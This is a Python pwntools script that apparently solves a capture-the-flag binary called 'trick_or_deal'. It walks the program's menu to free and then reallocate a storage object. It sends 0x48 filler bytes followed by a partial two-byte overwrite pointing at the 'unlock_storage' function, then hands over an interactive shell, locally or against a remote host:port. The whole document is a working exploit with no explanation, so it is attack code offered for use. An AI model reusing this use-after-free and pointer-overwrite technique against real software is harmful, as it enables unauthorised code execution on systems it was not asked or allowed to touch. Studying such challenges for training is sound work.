from pwn import *
import pdb

context.binary = elf = ELF('trick_or_deal')
glibc = ELF('glibc/libc.so.6', checksec=False)

context(terminal=['tmux', 'split-window', '-h', '-p', '65'])

gs = '''
init-pwndbg
'''

def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)

def main():
    p = get_process()
    #gdb.attach(p, gdbscript=gs, aslr=False)

    p.sendlineafter(b'[*] What do you want to do? ', b'4')
    
    p.sendlineafter(b'[*] What do you want to do? ', b'3')

    p.sendlineafter(b'[*] Are you sure that you want to make an offer(y/n): ', b'y')
    p.sendlineafter(b'[*] How long do you want your offer to be? ', str(0x50).encode())

    payload = b'A' * 0x48 + p16(context.binary.sym.unlock_storage & 0xffff)
    p.sendafter(b'[*] What can you offer me? ', payload)

    p.sendlineafter(b'[*] What do you want to do? ', b'1')
    p.interactive()

if __name__ == '__main__':
    main()
